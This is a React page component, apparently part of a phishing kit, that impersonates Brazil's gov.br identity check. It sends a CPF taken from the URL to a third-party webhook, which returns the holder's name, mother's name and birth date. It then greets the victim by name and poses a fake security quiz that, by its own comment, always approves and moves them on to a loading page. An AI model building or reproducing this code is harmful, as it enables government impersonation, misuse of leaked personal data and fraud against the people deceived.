import { useState, useEffect } from "react";
import { useLocation } from "wouter";

// Lista de nomes femininos para opções aleatórias
const NOMES_FEMININOS = [
  "Maria da Silva", "Ana Paula Santos", "Francisca Oliveira", "Antônia Costa",
  "Adriana Souza", "Juliana Ferreira", "Mariana Rodrigues", "Fernanda Lima",
  "Patrícia Alves", "Aline Pereira", "Cristina Martins", "Daniela Ribeiro",
  "Eliane Carvalho", "Fabiana Araújo", "Gabriela Nascimento", "Helena Dias",
  "Isabela Monteiro", "Jéssica Barbosa", "Karina Cardoso", "Larissa Gomes",
  "Mônica Teixeira", "Natália Correia", "Olivia Castro", "Paula Mendes",
  "Raquel Pinto", "Simone Moreira", "Tatiana Freitas", "Vanessa Cavalcanti",
  "Viviane Ramos", "Bruna Nunes", "Camila Vieira", "Denise Azevedo",
  "Elisa Campos", "Fátima Rocha", "Giovanna Barros", "Heloísa Lopes",
  "Ingrid Duarte", "Joana Medeiros", "Luciana Farias", "Márcia Cunha"
];

export default function Validacao() {
  const [, setLocation] = useLocation();
  const [cpf, setCpf] = useState("");
  const [userData, setUserData] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  
  const [nomeMaeOpcoes, setNomeMaeOpcoes] = useState<string[]>([]);
  const [nomeMaeSelecionado, setNomeMaeSelecionado] = useState("");
  const [dataNascimento, setDataNascimento] = useState("");
  const [estadoCivil, setEstadoCivil] = useState("");
  
  const [validationError, setValidationError] = useState("");

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const cpfParam = params.get("cpf");
    
    if (!cpfParam) {
      setLocation("/");
      return;
    }
    
    setCpf(cpfParam);
    fetchUserData(cpfParam);
  }, []);

  const gerarOpcoesNomeMae = (nomeCorreto: string | null) => {
    const opcoes: string[] = [];
    
    // Se temos o nome correto da API, incluir nas opções
    if (nomeCorreto && nomeCorreto.trim() !== "") {
      opcoes.push(nomeCorreto);
    }
    
    // Gerar 2 nomes aleatórios diferentes (total de 3 opções + "Nenhum dos nomes citados")
    const nomesDisponiveis = [...NOMES_FEMININOS];
    while (opcoes.length < 3) {
      const randomIndex = Math.floor(Math.random() * nomesDisponiveis.length);
      const nomeAleatorio = nomesDisponiveis[randomIndex];
      
      // Evitar duplicatas e não adicionar o nome correto novamente
      if (!opcoes.includes(nomeAleatorio)) {
        opcoes.push(nomeAleatorio);
      }
      
      nomesDisponiveis.splice(randomIndex, 1);
    }
    
    // Embaralhar as opções
    const opcoesEmbaralhadas = opcoes.sort(() => Math.random() - 0.5);
    
    // Adicionar "Nenhum dos nomes citados" no final
    opcoesEmbaralhadas.push("Nenhum dos nomes citados");
    
    return opcoesEmbaralhadas;
  };

  const fetchUserData = async (cpf: string) => {
    try {
      setLoading(true);
      const response = await fetch(
        `https://fluxos.kodexpert.com.br/webhook/e3358323-f6eb-42e5-8a54-7513d794b2c4/kodexpert/api/${cpf}`
      );
      
      if (!response.ok) {
        throw new Error("Erro ao buscar dados do CPF");
      }
      
      const data = await response.json();
      
      // A API retorna um objeto com "dados" array
      const dadosUsuario = data.dados && data.dados[0] ? data.dados[0] : null;
      
      if (!dadosUsuario) {
        throw new Error("Dados não encontrados");
      }
      
      // Estrutura correta da API: campos em MAIÚSCULO
      const userInfo = {
        nome: dadosUsuario.NOME || "",
        nome_mae: dadosUsuario.NOME_MAE || "",
        data_nascimento: dadosUsuario.NASC || "",
        cpf: dadosUsuario.CPF || "",
        sexo: dadosUsuario.SEXO || ""
      };
      
      setUserData(userInfo);
      
      // Gerar opções de múltipla escolha para nome da mãe
      const opcoes = gerarOpcoesNomeMae(userInfo.nome_mae || null);
      setNomeMaeOpcoes(opcoes);
      
      setLoading(false);
    } catch (err) {
      setError("Não foi possível validar seu CPF. Tente novamente mais tarde.");
      setLoading(false);
    }
  };

  const validateAnswers = () => {
    // VALIDAÇÃO SEMPRE APROVADA - aceita qualquer dado informado
    
    // Verifica apenas se os campos foram preenchidos
    if (!nomeMaeSelecionado) {
      setValidationError("Por favor, selecione uma opção.");
      setTimeout(() => setValidationError(""), 3000);
      return;
    }
    
    if (!dataNascimento) {
      setValidationError("Por favor, informe sua data de nascimento.");
      setTimeout(() => setValidationError(""), 3000);
      return;
    }
    
    if (!estadoCivil) {
      setValidationError("Por favor, informe seu estado civil.");
      setTimeout(() => setValidationError(""), 3000);
      return;
    }
    
    // Todos os campos preenchidos = redireciona para loading
    setLocation(`/loading-validacao?cpf=${cpf}`);
  };



  if (loading) {
    return (
      <>
        <header>
          <a href="#">
            <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
          </a>
        </header>
        <div className="container">
          <main id="main-signin">
            <div className="card">
              <h3>Carregando seus dados...</h3>
              <p>Aguarde enquanto validamos suas informações.</p>
            </div>
          </main>
        </div>
      </>
    );
  }

  if (error) {
    return (
      <>
        <header>
          <a href="#">
            <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
          </a>
        </header>
        <div className="container">
          <main id="main-signin">
            <div className="card">
              <h3>Erro na validação</h3>
              <p style={{ color: "#ff0000" }}>{error}</p>
              <button
                className="button-continuar"
                onClick={() => setLocation("/")}
              >
                Voltar
              </button>
            </div>
          </main>
        </div>
      </>
    );
  }

  return (
    <>
      <header>
        <a href="#">
          <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
        </a>
        <div id="acessibilidade">
          <span>
            <a href="#">
              <i className="fa fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="#">
              <i className="fa fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <div className="container">
        <aside id="aside-signin">
          <img
            id="identidade-govbr"
            src="/images/conta_govbr_v2.jpg"
            alt="Logomarca GovBR"
          />
        </aside>

        <main id="main-signin">
          {
            <div className="card" id="login-cpf">
              <h3>Validação de Dados</h3>
              <p>
                Olá, <strong>{userData?.nome}</strong>! Para sua segurança,
                precisamos confirmar alguns dados.
              </p>

              <div className="accordion-panel">
                <label htmlFor="nomeMae">1. Qual o nome da sua mãe?</label>
                <p style={{ fontSize: "13px", color: "#666", marginBottom: "10px" }}>
                  Selecione o nome correto abaixo:
                </p>
                
                <div style={{ marginBottom: "15px" }}>
                  {nomeMaeOpcoes.map((nome, index) => (
                    <div
                      key={index}
                      style={{
                        marginBottom: "8px",
                        padding: "12px",
                        border: nomeMaeSelecionado === nome ? "2px solid #008C32" : "1px solid #ddd",
                        borderRadius: "5px",
                        cursor: "pointer",
                        backgroundColor: nomeMaeSelecionado === nome ? "#e8f5e9" : "#fff",
                        transition: "all 0.2s"
                      }}
                      onClick={() => setNomeMaeSelecionado(nome)}
                    >
                      <label
                        style={{
                          display: "flex",
                          alignItems: "center",
                          cursor: "pointer",
                          margin: 0,
                          width: "100%",
                          gap: "12px"
                        }}
                      >
                        <input
                          type="radio"
                          name="nomeMae"
                          value={nome}
                          checked={nomeMaeSelecionado === nome}
                          onChange={(e) => setNomeMaeSelecionado(e.target.value)}
                          style={{ 
                            flexShrink: 0,
                            width: "18px",
                            height: "18px",
                            cursor: "pointer"
                          }}
                        />
                        <span style={{ 
                          fontWeight: nomeMaeSelecionado === nome ? "bold" : "normal",
                          flex: 1,
                          fontSize: "15px"
                        }}>
                          {nome}
                        </span>
                      </label>
                    </div>
                  ))}
                </div>

                <label htmlFor="dataNascimento">
                  2. Qual sua data de nascimento?
                </label>
                <input
                  id="dataNascimento"
                  type="date"
                  value={dataNascimento}
                  onChange={(e) => setDataNascimento(e.target.value)}
                  style={{ marginBottom: "15px" }}
                />

                <label htmlFor="estadoCivil">3. Qual seu estado civil?</label>
                <select
                  id="estadoCivil"
                  value={estadoCivil}
                  onChange={(e) => setEstadoCivil(e.target.value)}
                  style={{ marginBottom: "15px", padding: "10px", width: "100%" }}
                >
                  <option value="">Selecione</option>
                  <option value="solteiro">Solteiro(a)</option>
                  <option value="casado">Casado(a)</option>
                  <option value="divorciado">Divorciado(a)</option>
                  <option value="viuvo">Viúvo(a)</option>
                  <option value="uniao_estavel">União Estável</option>
                </select>

                {validationError && (
                  <p style={{ color: "#ff0000", marginBottom: "10px" }}>
                    {validationError}
                  </p>
                )}

                <div className="button-panel">
                  <button
                    className="button-continuar"
                    onClick={validateAnswers}
                  >
                    Validar Dados
                  </button>
                </div>
              </div>
            </div>
          }
        </main>
      </div>

      <footer></footer>
    </>
  );
}
